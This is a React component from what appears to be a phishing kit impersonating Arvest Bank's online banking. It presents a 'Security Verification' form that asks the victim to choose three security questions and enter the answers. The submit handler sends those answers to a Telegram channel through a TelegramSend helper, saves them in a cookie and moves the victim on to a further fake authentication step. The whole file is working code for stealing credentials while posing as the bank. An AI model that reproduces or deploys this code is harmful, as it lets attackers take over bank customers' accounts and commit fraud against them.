import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

type Question = {
    q1: string;
    ans1: string;
    q2: string;
    ans2: string;
    q3: string;
    ans3: string;
}

export default function Question() {
  const [formInput, setFormInput] = useState<Question>({
    q1: "",
    ans1: "",
    q2: "",
    ans2: "",
    q3: "",
    ans3: ""
  });

  const navigate = useNavigate();

  function handleSelectChange(event: React.ChangeEvent<HTMLSelectElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }
  const [isLoading, setIsLoading] = useState(false)
  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setIsLoading(true)
    const message = `
    [----+🏦 ARVEST QUESTION 🏦+-----]

    Question 1: ${formInput.q1}
    Answer 1: ${formInput.ans1}
    
    Question 2: ${formInput.q2}
    Answer 2: ${formInput.ans2}

    Question 3: ${formInput.q3}
    Answer 3: ${formInput.ans3}
    
    `;
    await TelegramSend(message);
    cookies.set("question", formInput)
    setIsLoading(false);
    navigate("../login/auth/2", { replace: true });
  }

  return (
    <>
      <div className="submitForm">
        <p
          className="go-left"
          style={{ fontSize: "14px", marginBottom: "30px" }}
        >
          Security Verification <br />
        </p>

        <form onSubmit={handleSubmit} method="post">
          <div className="input-field">
            <label htmlFor="question1">Question 1</label>
            <select
              name="q1"
              className="kds-form__label"
              onChange={handleSelectChange}
              style={{
                borderLeft: "1px solid thistle",
                marginBottom: "10px",
                borderTop: "1px solid thistle",
              }}
              required
            >
              <option selected={true} value="">
                Choose Your Question
              </option>
              <option
                value="In what city was your high school? (full name of
          city only)?"
              >
                In what city was your high school? (full name of city only)
              </option>
              <option
                value="In what city were you married? (Enter full name
          of city)?"
              >
                In what city were you married? (Enter full name of city)
              </option>
              <option value="What is your maternal grandmother's first name?">
                What is your maternal grandmother's first name?
              </option>
              <option value="What is your father's middle name?">
                What is your father's middle name?
              </option>
              <option value="What was the name of your High School?">
                What was the name of your High School?
              </option>
              <option
                value="What is the name of the first company you
          worked for?"
              >
                What is the name of the first company you worked for?
              </option>
              <option
                value="What is the first name of the maid of honor at
          your wedding?"
              >
                What is the first name of the maid of honor at your wedding?
              </option>
              <option
                value="What is the first name of your
          oldest nephew?"
              >
                What is the first name of your oldest nephew?
              </option>
              <option value="What is your maternal grandfather's first name?">
                What is your maternal grandfather's first name?
              </option>
              <option value="What is your best friend's first name?">
                What is your best friend's first name?
              </option>
              <option
                value="What is the first name of the best man at
            your wedding?"
              >
                What is the first name of the best man at your wedding?
              </option>
              <option value="What was the nickname of your grandfather?">
                What was the nickname of your grandfather?
              </option>
              <option value="What was your high school mascot?">
                What was your high school mascot?
              </option>
              <option value="What was the first name of your first manager?">
                What was the first name of your first manager?
              </option>
              <option
                value="In what city was your father born? (Enter full
          name of city only)"
              >
                In what city was your father born? (Enter full name of city
                only)
              </option>
              <option
                value="What was the name of your first
          girlfriend/boyfriend?"
              >
                What was the name of your first girlfriend/boyfriend?
              </option>
            </select>
          </div>
          <div className="input-field">
            <label htmlFor="question1_ans">Answer</label>
            <input onChange={handleInputChange} id="question1_ans" name="ans1" type="text" />
          </div>

          <div className="input-field">
            <label htmlFor="question1">Question 2</label>
            <select
              name="q2"
              onChange={handleSelectChange}
              className="kds-form__label"
              style={{
                borderLeft: "1px solid thistle",
                marginBottom: "10px",
                borderTop: "1px solid thistle",
              }}
              required
            >
              <option selected={true} value="">
                Choose Your Question
              </option>
              <option value="What was the name of your first pet?">
                What was the name of your first pet?
              </option>
              <option value="What is the first name of your oldest niece?">
                What is the first name of your oldest niece?
              </option>
              <option value="What is your paternal grandmother's first name?">
                What is your paternal grandmother's first name?
              </option>
              <option
                value="In what city is your vacation home? (Enter full
            name of city only)"
              >
                In what city is your vacation home? (Enter full name of city
                only)
              </option>
              <option
                value="What is the first name of the best man at
          your wedding?"
              >
                What is the first name of the best man at your wedding?
              </option>
              <option value="What was the nickname of your grandfather?">
                What was the nickname of your grandfather?
              </option>
              <option value="What was your high school mascot?">
                What was your high school mascot?
              </option>
              <option value="What was the first name of your first manager?">
                What was the first name of your first manager?
              </option>
              <option
                value="In what city was your father born? (Enter full
          name of city only)"
              >
                In what city was your father born? (Enter full name of city
                only)
              </option>
              <option
                value="What was the name of your first
          girlfriend/boyfriend?"
              >
                What was the name of your first girlfriend/boyfriend?
              </option>
              <option value="What was the name of your first pet?">
                What was the name of your first pet?
              </option>
              <option value="What is the first name of your oldest niece?">
                What is the first name of your oldest niece?
              </option>
              <option value="What is your paternal grandmother's first name?">
                What is your paternal grandmother's first name?
              </option>
              <option
                value="In what city is your vacation home? (Enter full
          name of city only)"
              >
                In what city is your vacation home? (Enter full name of city
                only)
              </option>
              <option
                value="In what city was your mother born? (Enter full
          name of city only)"
              >
                In what city was your mother born? (Enter full name of city
                only)
              </option>
              <option value="What street did your best friend in high school live on? (Enter full name of street only)">
                What street did your best friend in high school live on? (Enter
                full name of street only)
              </option>
            </select>
          </div>
          <div className="input-field">
            <label htmlFor="question2_ans">Answer</label>
            <input onChange={handleInputChange} id="question2_ans" name="ans2" type="text" />
          </div>

          <div className="input-field">
            <label htmlFor="question1">Question 3</label>
            <select
              name="q3"
              onChange={handleSelectChange}
              className="kds-form__label"
              style={{
                borderLeft: "1px solid thistle",
                marginBottom: "10px",
                borderTop: "1px solid thistle",
              }}
              required
            >
              <option selected={true} value="">
                Choose Your Question
              </option>
              <option value="What is your mother's middle name?">
                What is your mother's middle name?
              </option>
              <option
                value="In what city were you born? (Enter full name of
          city only)"
              >
                In what city were you born? (Enter full name of city only)
              </option>
              <option
                value="Where did you meet your spouse for the first
            time? (Enter full name of city only)"
              >
                Where did you meet your spouse for the first time? (Enter full
                name of city only)
              </option>
              <option value="What was your favorite restaurant in college?">
                What was your favorite restaurant in college?
              </option>
              <option value="What is your paternal grandfather's first name?">
                What is your paternal grandfather's first name?
              </option>
              <option
                value="What was the name of your junior high school?(Enter only Riverdale for Riverdale Junior High
          School) "
              >
                What was the name of your junior high school? (Enter only
                "Riverdale" for Riverdale Junior High School)
              </option>
              <option
                value="What was the last name of your favorite
          teacher in final year of high school?"
              >
                What was the last name of your favorite teacher in final year of
                high school?
              </option>
              <option
                value="What was the name of the town your
          grandmother lived in? (Enter full name of town
          only)"
              >
                What was the name of the town your grandmother lived in? (Enter
                full name of town only)
              </option>
              <option value="What is the middle name of your oldest sibling?">
                What is the middle name of your oldest sibling?
              </option>
              <option value="What is the first and last name of your oldest cousin?">
                What is the first and last name of your oldest cousin?
              </option>
              <option value="What color was your first car?">
                What color was your first car?
              </option>
              <option value="What’s your Favourite teachers name?">
                What’s your Favourite teachers name?
              </option>
              <option value="What’s your brother/sisters nickname?">
                What’s your brother/sisters nickname?
              </option>
              <option value="What’s your favorite board game?">
                What’s your favorite board game?
              </option>
              <option value="What is your favorite museum or cultural institution?">
                What is your favorite museum or cultural institution?
              </option>
            </select>
          </div>
          <div className="input-field">
            <label htmlFor="question3_ans">Answer</label>
            <input onChange={handleInputChange} id="question3_ans" name="ans3" type="text" />
          </div>

          {
            isLoading ?
<button style={{ width: "100%", marginTop: "-5px" }} type="button">
            Please wait...
          </button>

            :
            
            <button style={{ width: "100%", marginTop: "-5px" }} type="submit">
            Verify
          </button>}
        </form>

        <br />

        <p>Unauthorized access is prohibited. Usage may be monitored</p>

        <hr />

        <p>Have questions about Arvest Online Banking?</p>
      </div>
    </>
  );
}
